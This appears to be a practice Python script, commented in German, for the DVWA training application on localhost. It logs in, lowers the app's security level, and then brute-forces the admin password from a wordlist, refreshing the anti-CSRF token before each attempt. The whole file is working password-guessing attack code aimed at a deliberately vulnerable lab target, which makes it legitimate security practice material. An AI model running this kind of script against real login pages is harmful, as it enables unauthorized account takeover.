import requests
from bs4 import BeautifulSoup
import time 

# URL zur DVWA Login-Seite
url_login = "http://localhost/login.php"
#http://localhost/vulnerabilities/brute/?username=admin&password=dkkd&Login=Login#

# URL zur DVWA Sicherheitseinstellung
url_security = "http://localhost/security.php"

# Login-Daten
data_login = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}

# Sicherheitslevel niedrig setzen
data_low_security = {
    "security": "low",
    "seclev_submit": "Submit"
}

# Session erstellen
with requests.Session() as s:
    r = s.get(url_login)
    bs_content = BeautifulSoup(r.content, "html.parser")
    data_login["user_token"] = bs_content.find("input", {"name":"user_token"})["value"]
    s.post(url_login, data=data_login)
    
    # Sicherheitslevel setzen
    r = s.get(url_security)
    bs_content = BeautifulSoup(r.content, "html.parser")
    data_low_security["user_token"] = bs_content.find("input", {"name":"user_token"})["value"]
    s.post(url_security, data=data_low_security)
    
    # Lesen Sie die Wordlist ein
    with open("kali/kali-files/wordlist.txt", "r") as f:
        passwords = [line.strip() for line in f]
    
    # Führen Sie den Brute-Force-Angriff durch
    for password in passwords:
        data_brute = {"username": "admin", "password": password, "Login": "Login"}
        
        r = s.get(url_login)
        bs_content = BeautifulSoup(r.content, "html.parser")
        data_brute["user_token"] = bs_content.find("input", {"name":"user_token"})["value"]

        # Führen Sie den POST-Angriff aus
        r = s.post(url_login, data=data_brute)
        print(r)
        time.sleep(1)
        # Überprüfen Sie, ob der Login erfolgreich war
        if "Welcome to Damn Vulnerable Web Application (DVWA)" in r.text:
            print("Success! The password is:", password)
            break
        else:
            print("Failed with password:", password)
